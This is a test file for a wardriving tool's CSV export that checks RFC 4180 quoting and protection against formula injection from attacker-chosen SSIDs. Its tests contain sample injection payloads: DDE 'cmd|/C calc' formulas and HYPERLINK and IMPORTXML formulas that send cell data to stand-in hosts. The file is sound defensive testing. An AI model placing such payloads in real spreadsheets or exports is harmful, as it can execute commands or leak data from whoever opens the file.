/**
 * Tests for the CSV export cells.
 *
 *     npm run test:csv
 *
 * Why this exists.
 *
 * Two things can go wrong in a CSV cell, and this project has already been bitten
 * by the first:
 *
 *  1. A value containing `"` broke RFC 4180 quoting and shifted every following
 *     column on that row.
 *  2. A value starting with `=`, `+`, `-`, `@`, a tab or a carriage return is
 *     evaluated as a formula when the file is opened in Excel, LibreOffice or
 *     Google Sheets.
 *
 * The second is not hypothetical for a wardriving tool. An SSID is a string
 * chosen by whoever owns the access point, the survey records it verbatim, and
 * the CSV is handed to management to open in Excel. The report would be the
 * delivery mechanism.
 *
 * The hard part is that this export legitimately carries negative numbers —
 * RSSI, latitude, longitude — and blanket-escaping anything starting with `-`
 * would turn those columns into text and destroy the analysis the CSV is for.
 * Most of this file is about holding both of those at once.
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import { csvCell, csvRow, looksLikeSpreadsheetFormula } from '../.test-build/csv.mjs';

/** The value a spreadsheet or parser actually sees, with the RFC 4180 quoting undone. */
const unquoted = cell => {
  assert.match(cell, /^".*"$/s, `cell is not quoted: ${cell}`);
  return cell.slice(1, -1).replace(/""/g, '"');
};

// ── The premise ─────────────────────────────────────────────────────────────

test('the dangerous leading characters are the ones a spreadsheet evaluates', () => {
  // Note `+1` is absent deliberately: it is a plain number and stays one. Only
  // a leading sign that is NOT a complete number is a formula.
  for (const s of ['=1+1', '+1+1', '-1+1', '@SUM(A1)', '\tfoo', '\rfoo']) {
    assert.equal(looksLikeSpreadsheetFormula(s), true, `${JSON.stringify(s)} should be guarded`);
  }
});

test('ordinary text is not treated as a formula', () => {
  for (const s of ['', 'HomeWiFi', 'CVE-2022-0543', 'Cafe Guest', 'a=b', 'WPA2-PSK', '10.0.0.5']) {
    assert.equal(looksLikeSpreadsheetFormula(s), false, `${JSON.stringify(s)} should not be guarded`);
  }
});

// ── Negative numbers must stay numbers ──────────────────────────────────────

test('a negative RSSI is left as a number, because the column is analysed', () => {
  assert.equal(looksLikeSpreadsheetFormula('-72'), false);
  assert.equal(unquoted(csvCell(-72)), '-72');
  assert.equal(unquoted(csvCell('-72')), '-72');
});

test('negative coordinates and decimals stay numeric', () => {
  for (const v of ['-0.5', '-100.482910', '-1e5', '-1.5E-3', '-0']) {
    assert.equal(looksLikeSpreadsheetFormula(v), false, `${v} must stay numeric`);
    assert.equal(unquoted(csvCell(v)), v);
  }
});

test('a plus-signed number is still a number', () => {
  assert.equal(unquoted(csvCell('+42')), '+42');
});

test('but a negative sign followed by arithmetic is a formula, not a number', () => {
  // The payload that gets past a naive "leave anything starting with - alone" rule.
  assert.equal(looksLikeSpreadsheetFormula('-2+3'), true);
  assert.equal(unquoted(csvCell('-2+3')), "'-2+3");
  assert.equal(looksLikeSpreadsheetFormula("-2+3+cmd|'/c calc'!A1"), true);
});

// ── Formula payloads are neutralised ────────────────────────────────────────

test('an SSID named after a formula is exported as text, not evaluated', () => {
  const ssid = '=HYPERLINK("http://example.invalid/collect?d="&A1,"Click")';
  const cell = csvCell(ssid);
  assert.equal(unquoted(cell), `'${ssid}`, 'the apostrophe forces the spreadsheet to treat it as text');
  assert.ok(!/^"=/.test(cell), 'the cell must not open with = after the quote');
});

test('the classic command-execution payloads are all guarded', () => {
  const payloads = [
    '=cmd|\'/C calc\'!A0',
    '@SUM(1+9)*cmd|\' /C calc\'!A0',
    '+HYPERLINK("http://evil.invalid")',
    '=1+1',
    '=IMPORTXML("http://evil.invalid","//a")',
    '\t=1+1',
  ];
  for (const p of payloads) {
    assert.equal(unquoted(csvCell(p)), `'${p}`, `not guarded: ${p}`);
  }
});

test('a guarded value keeps its exact original text after the marker', () => {
  // The apostrophe is added, nothing is stripped or rewritten: the reader still
  // sees what the access point actually broadcast, which is the evidence.
  const ssid = '=Free WiFi';
  assert.equal(unquoted(csvCell(ssid)).slice(1), ssid);
});

// ── RFC 4180 quoting still holds ────────────────────────────────────────────

test('an internal double quote is doubled, so the row does not shift', () => {
  assert.equal(csvCell('say "hi"'), '"say ""hi"""');
  assert.equal(unquoted(csvCell('say "hi"')), 'say "hi"');
});

test('a comma, a newline and a CRLF stay inside one cell', () => {
  assert.equal(unquoted(csvCell('a,b')), 'a,b');
  assert.equal(unquoted(csvCell('a\nb')), 'a\nb');
  assert.equal(unquoted(csvCell('a\r\nb')), 'a\r\nb');
});

test('a quote-and-formula payload is both guarded and correctly quoted', () => {
  const nasty = '=HYPERLINK("http://evil.invalid","x"),extra';
  const cell = csvCell(nasty);
  assert.equal(unquoted(cell), `'${nasty}`);
  // Exactly one field: every internal quote doubled, nothing terminating early.
  assert.equal(cell.slice(1, -1).split('""').length - 1, 4, 'four internal quotes should each be doubled');
});

// ── Absent values ───────────────────────────────────────────────────────────

test('null and undefined become an empty cell, never the text "null"', () => {
  assert.equal(csvCell(null), '""');
  assert.equal(csvCell(undefined), '""');
});

test('a real zero is not confused with absence', () => {
  assert.equal(unquoted(csvCell(0)), '0');
  assert.equal(unquoted(csvCell('0')), '0');
});

test('false and NaN are stringified rather than dropped', () => {
  assert.equal(unquoted(csvCell(false)), 'false');
  assert.equal(unquoted(csvCell(NaN)), 'NaN');
});

// ── Rows ────────────────────────────────────────────────────────────────────

test('a row is CRLF-terminated and comma-separated', () => {
  assert.equal(csvRow(['a', 'b']), '"a","b"\r\n');
});

test('a row keeps its column count when a cell contains a comma', () => {
  const row = csvRow(['Cafe, Downtown', -72, null]);
  assert.equal(row, '"Cafe, Downtown","-72",""\r\n');
});

test('every cell in a row is guarded, not only the first', () => {
  const row = csvRow(['ok', '=1+1', '-72', '@cmd']);
  assert.equal(row, `"ok","\'=1+1","-72","\'@cmd"\r\n`);
});

test('an empty row is still a row', () => {
  assert.equal(csvRow([]), '\r\n');
});
